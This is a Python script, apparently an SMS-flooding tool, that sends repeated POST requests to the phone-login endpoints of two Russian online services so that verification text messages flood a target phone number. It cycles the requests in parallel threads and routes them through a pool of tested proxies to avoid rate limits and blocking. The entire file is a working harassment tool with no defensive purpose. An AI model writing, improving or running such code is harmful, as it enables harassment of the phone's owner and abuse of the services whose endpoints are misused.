import requests
import time
import argparse
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

WORKING_APIS = {
    "DNS": {
        "url": "https://www.dns-shop.ru/auth/auth/fast-authorization/",
        "method": "POST",
        "data": {"phone": "{phone}"}
    },
    "Utair": {
        "url": "https://b.utair.ru/api/v1/login/",
        "method": "POST",
        "data": {"login": "{phone}"}
    }
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*"
}

def check_proxy(proxy):
    try:
        test_url = "http://httpbin.org/ip"
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get(test_url, proxies=proxies, timeout=3)
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def load_and_check_proxies(filename="proxies.txt"):
    try:
        with open(filename, "r") as f:
            raw_proxies = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] File {filename} not found. Proceeding without proxies.")
        return []

    print(f"[*] Loaded {len(raw_proxies)} proxies. Testing first 300...")
    
    working = []
    test_batch = raw_proxies[:300]
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(check_proxy, p) for p in test_batch]
        for future in as_completed(futures):
            result = future.result()
            if result:
                working.append(result)
                print(f"[+] Working proxy found: {result} (Total: {len(working)})")
                
    print(f"[*] Proxy check complete. {len(working)} working proxies.")
    return working

def send_sms(service_name, api_data, phone, proxy_pool):
    try:
        url = api_data["url"]
        data = {}
        for k, v in api_data.get("data", {}).items():
            data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v

        proxy = None
        proxy_str = "Direct"
        if proxy_pool:
            p = random.choice(proxy_pool)
            proxy_str = p
            proxy = {"http": f"http://{p}", "https": f"http://{p}"}

        r = requests.post(url, data=data, headers=HEADERS, proxies=proxy, timeout=6)
        
        if r.status_code in [200, 201, 204]:
            print(f"[+] OK: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
        else:
            print(f"[-] FAIL: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
            
    except Exception as e:
        print(f"[!] ERR: {service_name} - {type(e).__name__} | Proxy: {proxy_str}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--phone", required=True)
    parser.add_argument("-c", "--count", type=int, default=1)
    parser.add_argument("-f", "--file", type=str, default="proxies.txt")
    args = parser.parse_args()

    phone = args.phone
    proxy_pool = load_and_check_proxies(args.file)

    print(f"\n[*] Target: {phone}")
    print(f"[*] APIs: {len(WORKING_APIS)}")
    print(f"[*] Cycles: {args.count}")
    print(f"[*] Proxies in pool: {len(proxy_pool)}\n")

    try:
        for i in range(args.count):
            print(f"--- Cycle {i+1} ---")
            with ThreadPoolExecutor(max_workers=len(WORKING_APIS)) as executor:
                for name, api_data in WORKING_APIS.items():
                    executor.submit(send_sms, name, api_data, phone, proxy_pool)
            
            if i < args.count - 1:
                time.sleep(3)
                
    except KeyboardInterrupt:
        print("\n[*] Stopped.")

if __name__ == "__main__":
    main()
